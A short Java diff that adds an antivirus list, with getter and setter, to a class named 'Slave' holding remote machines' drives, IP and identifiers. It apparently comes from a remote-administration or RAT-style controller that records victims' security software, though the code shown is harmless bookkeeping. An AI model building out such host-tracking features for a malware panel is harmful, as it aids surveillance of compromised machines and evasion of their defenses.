@@ -55,6 +55,7 @@ public class Slave implements Runnable {
 	private Drive[] drives;
 	private Monitor[] monitors;
 	private Locale[] locales;
+	private Antivirus[] antiviruses;
 
 	private String computername = "";
 	private String ip = "";
@@ -638,5 +639,13 @@ public class Slave implements Runnable {
 
 	public long getUniqueId() {
 		return uniqueId;
+	}
+
+	public void setAntiviruses(Antivirus[] antiviruses) {
+		this.antiviruses = antiviruses;
+	}
+	
+	public Antivirus[] getAntiviruses() {
+		return this.antiviruses;
 	}
 }
